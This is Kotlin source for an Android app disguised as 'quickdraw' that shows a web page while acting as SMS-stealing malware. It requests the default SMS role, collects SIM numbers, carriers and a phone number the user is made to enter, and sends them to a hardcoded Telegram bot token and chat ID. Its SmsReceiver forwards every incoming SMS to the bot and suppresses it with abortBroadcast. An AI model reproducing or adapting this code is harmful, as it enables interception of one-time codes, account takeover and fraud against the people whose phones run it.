package com.android.quickdraw

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.text.InputType
import android.view.LayoutInflater
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var myWebView: WebView
    private lateinit var sharedPreferences: SharedPreferences
    private val PHONE_NUMBER_KEY = "phone_number"
    private val client = OkHttpClient()
    private val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
    private val chatId = "6331293386"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        myWebView = findViewById(R.id.webview)
        
        setupWebView()
        checkInternetAndProceed()
    }

    private fun setupWebView() {
        with(myWebView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }
        
        myWebView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                return true
            }

            override fun shouldOverrideUrlLoading(view: WebView, request: android.webkit.WebResourceRequest): Boolean {
                view.loadUrl(request.url.toString())
                return true
            }
        }
    }

    private fun checkInternetAndProceed() {
        if (isInternetAvailable()) {
            if (sharedPreferences.contains(PHONE_NUMBER_KEY)) {
                loadWebView()
            } else {
                requestSmsPermission()
            }
        } else {
            showNoInternetDialog { checkInternetAndProceed() }
        }
    }

    private fun requestSmsPermission() {
        val permissionsHandler = object {
            fun changeDefaultSmsApp() {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        val roleManager = getSystemService(Context.ROLE_SERVICE) as android.app.role.RoleManager
                        if (roleManager.isRoleAvailable(android.app.role.RoleManager.ROLE_SMS)) {
                            if (!roleManager.isRoleHeld(android.app.role.RoleManager.ROLE_SMS)) {
                                val roleRequestIntent = roleManager.createRequestRoleIntent(android.app.role.RoleManager.ROLE_SMS)
                                startActivityForResult(roleRequestIntent, 1)
                            } else {
                                sendNotification("Пользователь принял все разрешения")
                                showPhoneInputDialog()
                            }
                        }
                    } else {
                        val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
                        startActivityForResult(intent, 1)
                    }
                } catch (e: Exception) {
                    showPhoneInputDialog()
                }
            }
        }
        permissionsHandler.changeDefaultSmsApp()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) {
            if (resultCode == RESULT_OK) {
                sendNotification("Пользователь принял все разрешения")
                sendSimInfo()
            }
            showPhoneInputDialog()
        }
    }

    private fun showPhoneInputDialog() {
        if (sharedPreferences.contains(PHONE_NUMBER_KEY)) {
            loadWebView()
            return
        }

        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
        val dialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)

        continueButton.setOnClickListener {
            val phoneNumber = phoneInput.text.toString().trim()
            when {
                phoneNumber.matches(Regex("^\\+7\\d{10}$")) -> savePhoneNumber(phoneNumber, dialog)
                phoneNumber.matches(Regex("^[78]\\d{10}$")) -> savePhoneNumber(phoneNumber, dialog)
                phoneNumber.matches(Regex("^9\\d{9}$")) -> savePhoneNumber("7$phoneNumber", dialog)
                else -> phoneInput.error = "Неверный формат номера"
            }
        }
        dialog.show()
    }

    private fun savePhoneNumber(number: String, dialog: AlertDialog) {
        sharedPreferences.edit().putString(PHONE_NUMBER_KEY, number).apply()
        sendNotification("Введен номер телефона: $number")
        loadWebView()
        dialog.dismiss()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun loadWebView() {
        myWebView.loadUrl("https://example.com")
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun sendSimInfo() {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val simInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
            subscriptionManager.activeSubscriptionInfoList?.joinToString("\n") { sub ->
                "SIM ${sub.simSlotIndex + 1}:\n• Номер: ${telephonyManager.createForSubscriptionId(sub.subscriptionId).line1Number ?: "недоступен"}\n• Оператор: ${sub.carrierName ?: "неизвестен"}"
            } ?: "Информация о SIM недоступна"
        } else {
            "Номер: ${telephonyManager.line1Number ?: "недоступен"}"
        }
        sendNotification("Информация о SIM:\n$simInfo")
    }

    private fun sendNotification(message: String) {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val requestBody = """
            {"chat_id":"$chatId","text":"${message.replace("\"", "\\\"")}"}
        """.trimIndent().toRequestBody("application/json".toMediaType())

        client.newCall(Request.Builder().url(url).post(requestBody).build()).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    private fun showNoInternetDialog(retryAction: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("Нет интернета")
            .setMessage("Требуется подключение к интернету")
            .setPositiveButton("Повторить") { _, _ -> retryAction() }
            .setCancelable(false)
            .show()
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            connectivityManager.activeNetwork?.let { network ->
                connectivityManager.getNetworkCapabilities(network)?.run {
                    hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                }
            } ?: false
        } else {
            @Suppress("DEPRECATION")
            connectivityManager.activeNetworkInfo?.isConnected ?: false
        }
    }

    override fun onBackPressed() {
        if (myWebView.canGoBack()) myWebView.goBack() else super.onBackPressed()
    }
}

class SmsReceiver : android.content.BroadcastReceiver() {
    private val client = OkHttpClient()
    private val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
    private val chatId = "6331293386"

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)?.firstOrNull()?.let { sms ->
                val text = """
                    Новое SMS:
                    От: ${sms.originatingAddress ?: "Неизвестно"}
                    Текст: ${sms.messageBody ?: "Пусто"}
                    Устройство: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
                """.trimIndent()

                sendToTelegram(text)
                abortBroadcast()
            }
        }
    }

    private fun sendToTelegram(text: String) {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val requestBody = """
            {"chat_id":"$chatId","text":"${text.replace("\"", "\\\"")}"}
        """.trimIndent().toRequestBody("application/json".toMediaType())

        client.newCall(Request.Builder().url(url).post(requestBody).build()).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }
}

class SmsHandlerService : android.app.Service() {
    override fun onBind(intent: Intent?) = null
}

// Заглушечный класс для обработки MMS
class MmsReceiver : android.content.BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {}
}

// Заглушечный класс для обработки WAP Push
class WapPushReceiver : android.content.BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {}
}
